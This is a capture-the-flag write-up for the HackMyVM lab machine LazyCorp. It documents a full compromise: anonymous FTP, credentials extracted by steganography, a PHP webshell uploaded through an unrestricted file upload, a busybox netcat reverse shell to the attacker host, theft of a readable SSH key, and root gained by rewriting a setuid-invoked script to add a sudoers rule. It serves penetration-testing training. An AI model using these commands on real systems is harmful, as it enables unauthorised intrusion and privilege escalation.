# LazyCorp

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| LazyCorp | anonmahaa | Beginner | HackMyVM |

**Summary:** LazyCorp is a beginner-level Linux machine that tells a realistic story of a sloppy development team. The attack chain begins with network discovery on a host-only subnet and a full port scan revealing three services: FTP (vsftpd 3.0.5) with anonymous login allowed, SSH (OpenSSH 8.2p1), and HTTP (Apache 2.4.41). The FTP server exposes a JPEG image (`note.jpg`) in its `pub` directory that, when analyzed with `stegseek`, yields embedded credentials hidden via steganography (empty passphrase). The credentials unlock a developer login portal discovered through web content enumeration (`/auth-lazycorp-dev/login.php`). The authenticated dashboard exposes an unrestricted file upload feature, through which a PHP one-liner webshell is uploaded and executed — achieving Remote Code Execution (RCE) as `www-data`. Post-exploitation reveals a SUID binary (`reset`) in the user `arvind`'s home directory that calls `/usr/bin/reset_site.sh` with root privileges. The world-writable permissions on that shell script, combined with `arvind`'s SSH private key left world-readable, allow lateral movement to `arvind` and subsequent privilege escalation: the reset script is rewritten to inject a passwordless sudo rule for `arvind` into `/etc/sudoers.d/`, and executing the SUID binary as `arvind` triggers it as root — yielding a full root shell.

---

## Reconnaissance

### Host Discovery

The target was identified on the `192.168.100.0/24` subnet using a custom PowerShell ARP/ICMP scanning script. The target responded at `192.168.100.135` with a VirtualBox MAC address prefix.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.135 08:00:27:53:AA:35 VirtualBox
```

### Port Scan — Nmap

A comprehensive Nmap scan with service detection, default scripts, and all-port coverage was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ nmap -sC -sV -p- -T4 192.168.100.135
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-27 16:04 WIB
Nmap scan report for 192.168.100.135
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      119          4096 Jul 16  2025 pub
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 46:82:43:4b:ef:e0:b0:50:04:c0:d5:2c:3c:5c:7d:4a (RSA)
|   256 52:79:ea:92:35:b4:f2:5d:b9:14:f0:21:1c:eb:2f:66 (ECDSA)
|_  256 98:fa:95:86:04:75:31:39:c6:60:26:9e:26:86:82:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: LazyCorp | Empowering Devs
| http-robots.txt: 2 disallowed entries
|_/cms-admin.php /auth-LazyCorp-dev/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.61 seconds
```

**Key findings from the scan:**
- **Port 21 — FTP (vsftpd 3.0.5):** Anonymous login is permitted; a `pub/` directory is visible.
- **Port 22 — SSH (OpenSSH 8.2p1):** Standard SSH, potential lateral movement target.
- **Port 80 — HTTP (Apache 2.4.41):** Web server titled "LazyCorp | Empowering Devs" with `robots.txt` disclosing two hidden paths: `/cms-admin.php` and `/auth-LazyCorp-dev/`.

---

## Initial Access

### Step 1 — FTP Anonymous Login & Steganography

The FTP service allowed anonymous login. Navigating into the `pub/` directory revealed a JPEG file (`note.jpg`, ~1.3 MB) which was downloaded in binary mode to preserve any hidden data.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ ftp 192.168.100.135
Connected to 192.168.100.135.
220 (vsFTPd 3.0.5)
Name (192.168.100.135:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||62990|)
150 Here comes the directory listing.
dr-xr-xr-x    3 114      119          4096 Jul 05  2025 .
dr-xr-xr-x    3 114      119          4096 Jul 05  2025 ..
drwxr-xr-x    2 114      119          4096 Jul 16  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||53804|)
150 Here comes the directory listing.
drwxr-xr-x    2 114      119          4096 Jul 16  2025 .
dr-xr-xr-x    3 114      119          4096 Jul 05  2025 ..
-rw-r--r--    1 0        0         1366786 Jul 16  2025 note.jpg
226 Directory send OK.
ftp> get note.jpg
local: note.jpg remote: note.jpg
229 Entering Extended Passive Mode (|||5863|)
150 Opening BINARY mode data connection for note.jpg (1366786 bytes).
100% |*****************************|  1334 KiB   18.85 MiB/s    00:00 ETA
226 Transfer complete.
1366786 bytes received in 00:00 (18.21 MiB/s)
ftp> bye
221 Goodbye.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ file note.jpg
note.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2296x4080, components 3
```

The image passed as a regular photograph (2296×4080 px). The blog's hidden HTML source hint (`<!-- Arvind: He used note.jpg again. Let's see how long it lasts this time. -->`) and the DevLog #2 hint about binary transfer preserving "hidden secrets" both pointed to steganographic content. Running `stegseek` with its built-in rockyou wordlist cracked the passphrase immediately — it was empty:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "creds.txt".
[i] Extracting to "note.jpg.out".


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ cat note.jpg.out
Username: dev
Password: d3v[REDACTED]
```

Credentials recovered: **dev / d3v[REDACTED]**

### Step 2 — Web Enumeration

The `robots.txt` file was checked first, then `feroxbuster` was used to brute-force web content:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/robots.txt
Disallow: /cms-admin.php
Disallow: /auth-LazyCorp-dev/

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/cms-admin.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.135 Port 80</address>
</body></html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/auth-LazyCorp-dev/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.135 Port 80</address>
</body></html>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/dev_admin_portal/login.php
<h1>Access Denied</h1>
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/uploads/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 192.168.100.135 Port 80</address>
</body></html>
```

The `robots.txt` paths returned 404 (case-sensitive mismatch). A second `feroxbuster` pass against the lowercase variant of the disallowed path was run:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ feroxbuster -u http://192.168.100.135/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x txt,php,js,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.135/
 🚩  In-Scope Url          │ 192.168.100.135
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, js, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c http://192.168.100.135/auth-LazyCorp-dev
404      GET        9l       31w      277c http://192.168.100.135/cms-admin.php
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l      100w      744c http://192.168.100.135/blog/blog.php
200      GET       17l       47w      582c http://192.168.100.135/
301      GET        9l       28w      317c http://192.168.100.135/blog => http://192.168.100.135/blog/
200      GET       17l       47w      582c http://192.168.100.135/index.html
200      GET       26l      136w     1060c http://192.168.100.135/blog/blog1.php
200      GET        2l        4w       55c http://192.168.100.135/robots.txt
301      GET        9l       28w      320c http://192.168.100.135/uploads => http://192.168.100.135/uploads/
[####################] - 38s    71310/71310   0s      found:9       errors:0
[####################] - 20s    23755/23755   1172/s  http://192.168.100.135/
[####################] - 30s    23755/23755   782/s   http://192.168.100.135/blog/
[####################] - 21s    23755/23755   1139/s  http://192.168.100.135/uploads/
```

The blog pages (`/blog/blog.php`, `/blog/blog1.php`) were notable. They contained development notes with hidden HTML comments:

**DevLog #1 — Credential Chaos**

![](image.png)

> *Hidden HTML source comment:* `<!-- Arvind: He used note.jpg again. Let's see how long it lasts this time. -->`
>
> The blog confirms that the developer "dev" keeps storing his credentials inside image files instead of a password manager. Arvind is aware but hasn't fixed it — a classic insider security failure.

**DevLog #2 — Transfer Woes and Lost Data**

![](image-1.png)

> *Hidden HTML source comment:* `<!-- Hidden Hint: Sometimes the simplest transfer method—one that preserves every byte—protects the hidden secrets best. -->`
>
> This is a direct hint to use **binary mode** when downloading `note.jpg` over FTP, ensuring the steganographic payload isn't corrupted in transit. ASCII mode would alter byte values and break steganographic extraction.

**DevLog #3 — Reset Ritual**

![](image-2.png)

> *Hidden HTML source comment:* `<!-- Arvind: Reset script was never meant to be writeable by anyone... yet here we are. -->`
>
> The blog reveals that a reset script lives under `/usr/local/bin/` (the actual path discovered later is `/usr/bin/reset_site.sh`) and explicitly foreshadows the world-writable permissions vulnerability that becomes the privilege escalation path.

Next, the lowercase path from `robots.txt` was enumerated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ feroxbuster -u http://192.168.100.135/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,js,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.135/auth-lazycorp-dev
 🚩  In-Scope Url          │ 192.168.100.135
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, js, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c http://192.168.100.135/cms-admin.php
404      GET        9l       31w      277c http://192.168.100.135/auth-LazyCorp-dev
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      330c http://192.168.100.135/auth-lazycorp-dev => http://192.168.100.135/auth-lazycorp-dev/
301      GET        9l       28w      338c http://192.168.100.135/auth-lazycorp-dev/uploads => http://192.168.100.135/auth-lazycorp-dev/uploads/
200      GET       21l       53w      710c http://192.168.100.135/auth-lazycorp-dev/login.php
302      GET        0l        0w        0c http://192.168.100.135/auth-lazycorp-dev/dashboard.php => login.php
```

**Key findings:** `login.php` (200 OK) and `dashboard.php` (302 → `login.php`) confirmed an authenticated portal under `/auth-lazycorp-dev/` as well as an accessible `uploads/` subdirectory.

### Step 3 — Authenticated Login & Unrestricted File Upload

Logging into `http://192.168.100.135/auth-lazycorp-dev/login.php` with the recovered credentials (`dev` / `d3v[REDACTED]`) granted access to the dashboard:

![](image-3.png)

The dashboard exposed an **"Upload Site Module"** form with no content-type or extension validation. A PHP webshell was crafted and uploaded directly:

![](image-4.png)

The shell was uploaded and immediately reachable at `/auth-lazycorp-dev/uploads/shell.php`. RCE was confirmed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/auth-lazycorp-dev/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 4 — Reverse Shell

A netcat listener was set up on the attacker machine and the webshell was used to trigger a reverse shell via `busybox nc`:

**Listener:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

**Trigger:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ curl http://192.168.100.135/auth-lazycorp-dev/uploads/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

**Connection received and TTY upgraded:**
```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 58170
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@arvindlazycorp:/var/www/html/auth-lazycorp-dev/uploads$ ^Z
zsh: suspended  nc -lnvp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@arvindlazycorp:/var/www/html/auth-lazycorp-dev/uploads$ cd /
www-data@arvindlazycorp:/$ export SHELL=/bin/bash
www-data@arvindlazycorp:/$ export TERM=xterm-256color
www-data@arvindlazycorp:/$ stty rows 50 cols 200
```

A fully interactive TTY shell was established as `www-data`.

---

## Privilege Escalation

### Step 5 — Internal Enumeration as www-data

With a shell on the box, local users were enumerated and `arvind`'s home directory was explored:

```bash
www-data@arvindlazycorp:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
arvind:x:1000:1000:arvind:/home/arvind:/bin/bash
www-data@arvindlazycorp:/$ ls -la /home/arvind/
total 60
drwxr-xr-x 5 arvind arvind  4096 Jul 16  2025 .
drwxr-xr-x 3 root   root    4096 Jul  5  2025 ..
-rw------- 1 arvind arvind    16 Jul 16  2025 .bash_history
-rw-r--r-- 1 arvind arvind   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 arvind arvind  3771 Feb 25  2020 .bashrc
drwx------ 2 arvind arvind  4096 Jul  5  2025 .cache
drwxrwxr-x 3 arvind arvind  4096 Jul  7  2025 .local
-rw-r--r-- 1 arvind arvind   807 Feb 25  2020 .profile
drwxr-xr-x 2 arvind arvind  4096 Jul  9  2025 .ssh
-rw-r--r-- 1 arvind arvind     0 Jul  5  2025 .sudo_as_admin_successful
-rwsr-xr-x 1 root   root   16744 Jul 16  2025 reset
-rw-r--r-- 1 arvind arvind    28 Jul 16  2025 user.txt
```

Two critical observations:
1. **`reset`** is a SUID binary owned by root (`-rwsr-xr-x`) — it runs as root regardless of who executes it.
2. **`.ssh/`** directory is world-readable (`drwxr-xr-x`).

### Step 6 — Analysing the SUID Binary

`strings` was used to inspect the `reset` binary without executing it:

```bash
www-data@arvindlazycorp:/$ cd /home/arvind/
www-data@arvindlazycorp:/home/arvind$ which strings
/usr/bin/strings
www-data@arvindlazycorp:/home/arvind$ strings reset
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/usr/bin/reset_site.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
...
```

The binary calls `system("/usr/bin/reset_site.sh")` after `setuid(0)`. This means whatever is inside `/usr/bin/reset_site.sh` will execute as **root**.

Checking the permissions of the script:

```bash
www-data@arvindlazycorp:/home/arvind$ ls -la /usr/bin/reset_site.sh
-rwxrwxr-x 1 root arvind 254 Jul  9  2025 /usr/bin/reset_site.sh
www-data@arvindlazycorp:/home/arvind$ file /usr/bin/reset_site.sh
/usr/bin/reset_site.sh: Bourne-Again shell script, ASCII text executable
www-data@arvindlazycorp:/home/arvind$ cat /usr/bin/reset_site.sh
#!/bin/bash

echo "[*] Resetting website from backup..."

# Remove current site
rm -rf /var/www/html/*
# Restore from backup
cp -r /opt/backup/* /var/www/html/
# Set correct ownership
chown -R www-data:www-data /var/www/html/

echo "[+] Done resetting."
```

The script is **world-writable** by the `arvind` group (`-rwxrwxr-x`). As the DevLog #3 hidden comment forewarned: *"Reset script was never meant to be writeable by anyone... yet here we are."* Since `www-data` is not `arvind`, we first need to pivot to `arvind`.

### Step 7 — Lateral Movement via Exposed SSH Private Key

`arvind`'s `.ssh/` directory was world-readable, exposing the private key:

```bash
www-data@arvindlazycorp:/home/arvind$ cd .ssh
www-data@arvindlazycorp:/home/arvind/.ssh$ ls -la
total 20
drwxr-xr-x 2 arvind arvind 4096 Jul  9  2025 .
drwxr-xr-x 5 arvind arvind 4096 Jul 16  2025 ..
-rw------- 1 arvind arvind  747 Jul  9  2025 authorized_keys
-rw-r--r-- 1 arvind arvind 3389 Jul  9  2025 id_rsa
-rw-r--r-- 1 arvind arvind  747 Jul  9  2025 id_rsa.pub
```

The `id_rsa` private key was world-readable (`-rw-r--r--`). It was read and saved on the attacker machine:

```bash
www-data@arvindlazycorp:/home/arvind/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
..............................[REDACTED]..............................
O/7dFLMYo/OOMwAAABVhcnZpbmRAYXJ2aW5kbGF6eWNvcnABAgME
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ vim id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/lazzycorp]
└─$ ssh -i id_rsa arvind@192.168.100.135
...
arvind@arvindlazycorp:~$
```

Successfully pivoted to user `arvind`.

### Step 8 — Exploiting the Writable Reset Script for Root

As `arvind`, the group-writable `/usr/bin/reset_site.sh` was overwritten with a payload that injects a passwordless sudo rule for `arvind` into `/etc/sudoers.d/`:

```bash
arvind@arvindlazycorp:~$ vim /usr/bin/reset_site.sh
arvind@arvindlazycorp:~$ cat /usr/bin/reset_site.sh
#!/bin/bash
echo "arvind ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/arvind
chown root:root /etc/sudoers.d/arvind
chmod 0440 /etc/sudoers.d/arvind
```

The SUID `reset` binary was then executed as `arvind`. Because the binary calls `setuid(0)` before invoking `system()`, the script ran as root — writing the sudoers file with correct ownership and permissions:

```bash
arvind@arvindlazycorp:~$ ./reset
arvind@arvindlazycorp:~$ sudo su
root@arvindlazycorp:/home/arvind# cd
root@arvindlazycorp:~# id
uid=0(root) gid=0(root) groups=0(root)
root@arvindlazycorp:~# whoami ; hostname
root
arvindlazycorp
```

### Step 9 — Flags

```bash
root@arvindlazycorp:~# cat /home/arvind/user.txt /root/root.txt
FLAG{you[REDACTED]}
FLAG{laz[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Discovered target `192.168.100.135` (VirtualBox) via subnet ping scan. Full Nmap scan revealed FTP (21), SSH (22), and HTTP (80). FTP allowed anonymous login with a `pub/` directory; HTTP exposed `robots.txt` disclosing `/cms-admin.php` and `/auth-LazyCorp-dev/`.

2. **Vulnerability Discovery**: Anonymous FTP download of `note.jpg` (1.3 MB JPEG). StegSeek cracked the steganographic payload (empty passphrase), extracting `creds.txt` with credentials `dev:d3v[REDACTED]`. Blog at `/blog/` leaked development intel via hidden HTML comments — confirming credential storage in images and hinting at a writable reset script.

3. **Exploitation**: Authenticated to the developer portal at `/auth-lazycorp-dev/login.php` using recovered credentials. Dashboard exposed an unrestricted file upload panel. Uploaded a PHP one-liner webshell (`shell.php`), confirmed RCE as `www-data`, then triggered a `busybox nc` reverse shell for an interactive foothold.

4. **Internal Enumeration**: Enumerated local users — found `arvind` with a SUID binary (`reset`) in their home directory. `strings` analysis of the binary revealed it calls `setuid(0)` then executes `/usr/bin/reset_site.sh` via `system()`. The script had world-writable permissions (`-rwxrwxr-x`). `arvind`'s `.ssh/id_rsa` was world-readable, enabling key extraction.

5. **Privilege Escalation**: SSH'd into `arvind` using the extracted private key. Overwrote `/usr/bin/reset_site.sh` with a sudoers injection payload. Executed the SUID `reset` binary as `arvind` — triggering the payload as root, which wrote `/etc/sudoers.d/arvind` granting `arvind` full passwordless sudo. Ran `sudo su` to obtain a root shell and captured both flags.
